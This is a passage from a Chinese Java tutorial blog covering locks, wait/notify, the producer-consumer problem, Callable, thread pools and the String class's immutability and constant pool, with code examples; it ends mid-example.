<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"><span class="comment">//1. 必须保证多个线程共用一个lock实例，可以将此对象声明为static final</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="comment">//2. 执行lock方法，锁定对共享资源的调用</span></span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;售票，票号为&quot;</span> + ticket);</span><br><span class="line">                ticket--;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//3. 执行unlock方法，解锁对共享资源的调用</span></span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>synchronized与Lock的对比</strong></p>
<ol>
<li>Lock是显式锁（手动开启和关闭锁，别忘记关闭锁），synchronized是隐式锁，出了作用域、遇到异常等自动解锁</li>
<li>Lock只有代码块锁，synchronized有代码块锁和方法锁</li>
<li>使用Lock锁，JVM将花费较少的时间来调度线程，性能更好。并且具有更好的扩展性（提供更多的子类），更体现面向对象。</li>
<li>（了解）Lock锁可以对读不加锁，对写加锁，synchronized不可以</li>
<li>（了解）Lock锁可以有多种获取锁的方式，可以从sleep的线程中抢到锁，synchronized不可以</li>
</ol>
<p>因此：开发建议中处理线程安全问题优先使用顺序为：Lock —-&gt; 同步代码块 —-&gt; 同步方法</p>
<h4 id="线程通信-等待唤醒机制"><a href="#线程通信-等待唤醒机制" class="headerlink" title="线程通信-等待唤醒机制"></a>线程通信-等待唤醒机制</h4><p>在一个线程满足某个条件时，就进入等待状态（<code>wait() / wait(time)</code>）， 等待其他线程执行完他们的指定代码过后再将其唤醒（<code>notify()</code>）;或可以指定wait的时间，等时间到了自动唤醒；在有多个线程进行等待时，如果需要，可以使用 <code>notifyAll()</code>来唤醒所有的等待线程。wait&#x2F;notify 就是线程间的一种协作机制。</p>
<ol>
<li>wait：线程不再活动，不再参与调度，进入 <code>wait set</code>（等待状态） 中，因此不会浪费 CPU 资源，也不会去竞争锁了，这时的线程状态是 WAITING 或 TIMED_WAITING。它还要等着别的线程执行一个<code>特别的动作</code>，也即“<code>通知（notify）</code>”或者等待时间到，在这个对象上等待的线程从wait set 中释放出来，重新进入到调度队列（<code>ready queue</code>）中</li>
<li>notify：则选取所通知对象的 wait set 中的一个优先级最高的线程释放；如果多个优先级相同，随机释放一个</li>
<li>notifyAll：则释放所通知对象的 wait set 上的全部线程。</li>
</ol>
<p>注意：</p>
<ol>
<li>此三个方法必须使用在同步方法或同步代码块中，因为：必须要<code>通过锁对象</code>调用这2个方法。否则会报java.lang.IllegalMonitorStateException异常。lock需要配合Condition实现进程通信</li>
<li>此方法的<strong>调用者必须是同步监视器</strong>！！！</li>
<li>此三方法均定义在Object类中</li>
</ol>
<p>示例：打印1-100，两线程交替打印。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrintNumberTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">PrintNumber</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintNumber</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(p,<span class="string">&quot;线程1&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(p,<span class="string">&quot;线程2&quot;</span>);</span><br><span class="line">        t1.start();t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PrintNumber</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>)&#123;</span><br><span class="line"></span><br><span class="line">                notify();<span class="comment">//唤醒，相当于this.notify()</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (number &lt;= <span class="number">100</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">10</span>);</span><br><span class="line">                        <span class="comment">//不会释放对同步监视器的调用</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + number);</span><br><span class="line">                    number++;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        wait();</span><br><span class="line">                        <span class="comment">//线程一旦执行此方法，进入等待状态，同时会释放对同步监视器的调用</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="生产者消费者问题"><a href="#生产者消费者问题" class="headerlink" title="生产者消费者问题"></a>生产者消费者问题</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProducerCustomerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Clerk</span> <span class="variable">clerk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Clerk</span>();</span><br><span class="line">        <span class="type">Producer</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Producer</span>(clerk);</span><br><span class="line"></span><br><span class="line">        <span class="type">Consumer</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Consumer</span>(clerk);</span><br><span class="line">        <span class="type">Consumer</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Consumer</span>(clerk);</span><br><span class="line"></span><br><span class="line">        p1.setName(<span class="string">&quot;生产者1&quot;</span>);</span><br><span class="line">        c1.setName(<span class="string">&quot;消费者1&quot;</span>);</span><br><span class="line">        c2.setName(<span class="string">&quot;消费者2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        p1.start();</span><br><span class="line">        c1.start();</span><br><span class="line">        c2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Clerk clerk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Producer</span><span class="params">(Clerk clerk)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.clerk = clerk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;=========生产者开始生产产品========&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">20</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//要求clerk去增加产品</span></span><br><span class="line">            clerk.addProduct();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费者</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Clerk clerk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Consumer</span><span class="params">(Clerk clerk)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.clerk = clerk;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=========消费者开始消费产品========&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//要求clerk去减少产品</span></span><br><span class="line">            clerk.minusProduct();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//资源类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clerk</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">productNum</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//产品数量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_PRODUCT</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MIN_PRODUCT</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//增加产品</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">addProduct</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(productNum &gt;= MAX_PRODUCT)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            productNum++;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() +</span><br><span class="line">                    <span class="string">&quot;生产了第&quot;</span> + productNum + <span class="string">&quot;个产品&quot;</span>);</span><br><span class="line">            <span class="comment">//唤醒消费者</span></span><br><span class="line">            <span class="built_in">this</span>.notifyAll();        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">minusProduct</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(productNum &lt; MIN_PRODUCT)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() +</span><br><span class="line">                    <span class="string">&quot;消费了第&quot;</span> + productNum + <span class="string">&quot;个产品&quot;</span>);</span><br><span class="line">            productNum--;</span><br><span class="line">            notify();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="线程创建方式之Callable-了解"><a href="#线程创建方式之Callable-了解" class="headerlink" title="线程创建方式之Callable(了解)"></a>线程创建方式之Callable(了解)</h4><p><strong>Callable</strong></p>
<p>与使用Runnable相比， Callable功能更强大些</p>
<ul>
<li>相比run()方法，call()方法可以有返回值</li>
<li>方法可以使用throw的方式抛出异常</li>
<li>支持泛型的返回值（需要借助FutureTask类，获取返回结果）</li>
<li>缺点：在获取分线程执行结果的时候，当前线程（或是主线程）受阻塞，效率较低。</li>
</ul>
<p>Future接口（了解）</p>
<ul>
<li>可以对具体Runnable、Callable任务的执行结果进行取消、查询是否完成、获取结果等。</li>
<li>FutureTask是Futrue接口的唯一的实现类</li>
<li>FutureTask 同时实现了Runnable, Future接口。它既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值</li>
</ul>
<p>代码举例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.创建一个实现Callable的实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NumThread</span> <span class="keyword">implements</span> <span class="title class_">Callable</span> &#123;</span><br><span class="line">    <span class="comment">//2.实现call方法，将此线程需要执行的操作声明在call()中</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(i);</span><br><span class="line">                sum += i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CallableTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//3.创建Callable接口实现类的对象</span></span><br><span class="line">        <span class="type">NumThread</span> <span class="variable">numThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NumThread</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.将此Callable接口实现类的对象作为传递到FutureTask构造器中，创建FutureTask的对象</span></span><br><span class="line">        <span class="type">FutureTask</span> <span class="variable">futureTask</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FutureTask</span>(numThread);</span><br><span class="line">        <span class="comment">//5.将FutureTask的对象作为参数传递到Thread类的构造器中，创建Thread对象，并调用start()</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(futureTask).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//      接收返回值</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//6.获取Callable中call方法的返回值</span></span><br><span class="line">            <span class="comment">//get()返回值即为FutureTask构造器参数Callable实现类重写的call()的返回值。</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">sum</span> <span class="operator">=</span> futureTask.get();</span><br><span class="line">            System.out.println(<span class="string">&quot;总和为：&quot;</span> + sum);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="线程创建方式之线程池"><a href="#线程创建方式之线程池" class="headerlink" title="线程创建方式之线程池"></a>线程创建方式之线程池</h4><p>如果并发的线程数量很多，并且每个线程都是执行一个时间很短的任务就结束了，这样频繁创建线程就会大大降低系统的效率，因为频繁创建线程和销毁线程需要时间。那么有没有一种办法使得线程可以复用，即执行完一个任务，并不被销毁，而是可以继续执行其他的任务？</p>
<p><strong>思路：</strong>提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中。可以避免频繁创建销毁、实现重复利用。类似生活中的公共交通工具。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240711215500.png" alt="线程池的理解"></p>
<p><strong>好处：</strong></p>
<ul>
<li>提高响应速度（减少了创建新线程的时间）</li>
<li>降低资源消耗（重复利用线程池中线程，不需要每次都创建）</li>
<li>便于线程管理<ul>
<li>corePoolSize：核心池的大小</li>
<li>maximumPoolSize：最大线程数</li>
<li>keepAliveTime：线程没有任务时最多保持多长时间后会终止</li>
<li>…</li>
</ul>
</li>
</ul>
<p><strong>线程池相关API</strong></p>
<p>JDK5.0之前，我们必须手动自定义线程池。从JDK5.0开始，Java内置线程池相关的API。在java.util.concurrent包下提供了线程池相关API：<code>ExecutorService</code> 和 <code>Executors</code>。</p>
<ul>
<li><code>ExecutorService</code>：真正的线程池接口。常见子类ThreadPoolExecutor<ul>
<li><code>void execute(Runnable command)</code> ：执行任务&#x2F;命令，没有返回值，一般用来执行Runnable</li>
<li><code>&lt;T&gt; Future&lt;T&gt; submit(Callable&lt;T&gt; task)</code>：执行任务，有返回值，一般又来执行Callable</li>
<li><code>void shutdown()</code> ：关闭连接池</li>
</ul>
</li>
<li><code>Executors</code>：一个线程池的工厂类，通过此类的静态工厂方法可以创建多种类型的线程池对象。<ul>
<li><code>Executors.newCachedThreadPool()</code>：创建一个可根据需要创建新线程的线程池</li>
<li><code>Executors.newFixedThreadPool(int nThreads)</code>; 创建一个可重用固定线程数的线程池</li>
<li><code>Executors.newSingleThreadExecutor()</code> ：创建一个只有一个线程的线程池</li>
<li><code>Executors.newScheduledThreadPool(int corePoolSize)</code>：创建一个线程池，它可安排在给定延迟后运行命令或者定期地执行。</li>
</ul>
</li>
</ul>
<p><strong>代码举例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumberThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt;= <span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;: &quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NumberThread1</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt;= <span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;: &quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NumberThread2</span> <span class="keyword">implements</span> <span class="title class_">Callable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">evenSum</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//记录偶数的和</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt;= <span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                evenSum += i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> evenSum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadPoolTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1. 提供指定线程数量的线程池</span></span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">service</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">service1</span> <span class="operator">=</span> (ThreadPoolExecutor) service;</span><br><span class="line"><span class="comment">//        //设置线程池的属性</span></span><br><span class="line"><span class="comment">//        System.out.println(service.getClass());//ThreadPoolExecutor</span></span><br><span class="line">        service1.setMaximumPoolSize(<span class="number">50</span>); <span class="comment">//设置线程池中线程数的上限</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.执行指定的线程的操作。需要提供实现Runnable接口或Callable接口实现类的对象</span></span><br><span class="line">        service.execute(<span class="keyword">new</span> <span class="title class_">NumberThread</span>());<span class="comment">//适合适用于Runnable</span></span><br><span class="line">        service.execute(<span class="keyword">new</span> <span class="title class_">NumberThread1</span>());<span class="comment">//适合适用于Runnable</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Future</span> <span class="variable">future</span> <span class="operator">=</span> service.submit(<span class="keyword">new</span> <span class="title class_">NumberThread2</span>());<span class="comment">//适合使用于Callable</span></span><br><span class="line">            System.out.println(<span class="string">&quot;总和为：&quot;</span> + future.get());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.关闭连接池</span></span><br><span class="line">        service.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="第11章-常用类和基础API"><a href="#第11章-常用类和基础API" class="headerlink" title="第11章_常用类和基础API"></a>第11章_常用类和基础API</h3><h4 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h4><h5 id="相关声明"><a href="#相关声明" class="headerlink" title="相关声明"></a>相关声明</h5><p><strong>String类的声明</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">String</span></span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable, Comparable&lt;String&gt;, CharSequence,</span><br><span class="line">               Constable, ConstantDesc</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>private意味着外面无法直接获取字符数组，而且String没有提供value的get和set方法。</li>
<li>final意味着字符数组的引用不可改变，而且String也没有提供方法来修改value数组某个元素值<br>因此字符串的字符数组内容也不可变的，即String代表着不可变的字符序列。即，一旦对字符串进行修改，就会产生新对象。</li>
<li>Serializable:可序列化的接口，凡是实现此接口的类的对象就可以通过网络或本地流进行数据传输</li>
<li>Comparable：凡是实现此接口的类，其对象都可以比较大小</li>
</ul>
<p><strong>String类的属性</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">byte</span>[] value;</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li><strong>final</strong>：说明此数组一旦初始化，其地址就不可改变</li>
</ul>
<p>字符串常量的<strong>存储位置</strong></p>
<ul>
<li>字符串常量存储在字符串常量池(StringTable)中</li>
<li>字符串常量池不允许存放两个相同的字符串<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">System.out.println(s1 == s2);<span class="comment">//true，两个字符串的地址相同</span></span><br></pre></td></tr></table></figure></li>
<li>字符串常量池在不同jdk版本，存放位置不同<br>jdk&lt;7  存放在方法区<br>jdk&gt;&#x3D;7 存放在堆空间（为方便JC回收，方法区回收频率低）</li>
</ul>
<p><strong>String不可变性的理解</strong></p>
<ol>
<li>当对字符串变量重新赋值时，需要重新指定一个字符串常量的位置进行赋值，不能在原有位置修改</li>
<li>当对现有字符串进行拼接操作时，需要重新开辟空间保存拼接后的字符串，不能在原有位置修改</li>
<li>当调用字符串的replace()替换现有某个字符时，需要重新开辟空间保存修改以后的字符串，不能在原有位置修改</li>
<li>上述操作都是类中源码自主完成的，不需要使用String的程序员自主实现</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240712133305.png" alt="String不可变性的理解2"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240712133441.png" alt="String不可变性的理解3"><br>(实际上上图中的0x1122是value数组的位置，value数组再指向字符串hello)   </p>
<p><strong>String实例化的两种方式</strong></p>
<ol>
<li><code>String s = new String(&quot;hello&quot;);</code> 创建了2个对象，一个是堆空间中new分配的，一个是字符串常量池中生成的字符串常量</li>
<li><code>String s = &quot;hello&quot;</code></li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240712134227.png" alt="两种创建方式的不同地址"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240712134802.png" alt="类中字符串的地址"></p>
<p><strong>String的连接操作+</strong></p>
<ol>
<li>常量 + 常量：转为字节码时会直接视为一个字符串，结果仍然存储在字符串常量池中(常量包括普通常量和final修饰的变量)</li>
<li>变量 + 变量;变量 + 常量: 都会通过new的方式创建一个新的字符串，返回堆空间中此字符串对象的地址</li>
<li>调用字符串的intern(): 返回字符串常量池中字面量的地址（存在返回已有，不存在新建再返回）</li>
<li>concat():不管常量还是变量调用此方法，参数不论是常量变量，都返回一个新new的对象</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;World!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;HelloWorld!&quot;</span>; <span class="comment">//直接在字符串常量池中创建一个字面量为&quot;HelloWorld!&quot;的字符串。</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s4</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span> + <span class="string">&quot;World!&quot;</span>; <span class="comment">//s4指向字符串常量池中已经创建的&quot;HelloWorld!&quot;的字符串。</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s5</span> <span class="operator">=</span> s1 + <span class="string">&quot;World!&quot;</span>; <span class="comment">//字符串内容也是HelloWorld!，s1是常量，常量+ 常量 结果在常量池中</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s6</span> <span class="operator">=</span> s1 + s2; <span class="comment">//字符串内容也是HelloWorld!，s1和s2都是常量，常量+ 常量 结果在常量池中</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s7</span> <span class="operator">=</span> 